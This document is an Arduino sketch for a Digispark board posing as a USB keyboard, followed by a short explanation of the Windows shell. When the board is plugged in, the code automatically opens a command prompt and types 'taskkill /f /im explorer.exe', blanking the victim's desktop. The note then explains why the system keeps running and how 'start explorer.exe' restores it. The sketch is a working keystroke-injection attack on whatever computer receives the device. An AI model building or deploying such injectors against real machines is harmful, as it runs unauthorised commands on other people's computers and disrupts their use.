#include "DigiKeyboard.h"

void setup() {

  DigiKeyboard.delay(3000);  // Wait for system to recognize USB

  // Open Run dialog (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Type CMD
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // run explorer.exe file which will black desktop
   DigiKeyboard.print("taskkill /f /im explorer.exe");  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}





#explorer.exe is the Windows graphical shell, which means it is the program responsible for showing and managing the desktop interface you interact with every day.
It controls the desktop icons, taskbar, Start menu, system tray, File Explorer windows, and even the wallpaper display. 
When you run the command taskkill /f /im explorer.exe, you are forcefully stopping this shell process. As a result, all those visual components disappear, 
making it look like the system has gone blank.

However, the operating system itself is still running in the background because core system processes 
like the Windows kernel and essential services are not affected. This is why the computer does not shut down or crash—it simply loses its graphical interface. 

When you type start explorer.exe, you are restarting the Windows shell, which reloads the desktop environment and brings back the icons, taskbar, and other
interface elements. In simple terms, explorer.exe acts like the “control center” of the Windows user interface, and stopping it temporarily removes your
ability to see and interact with the desktop normally. 

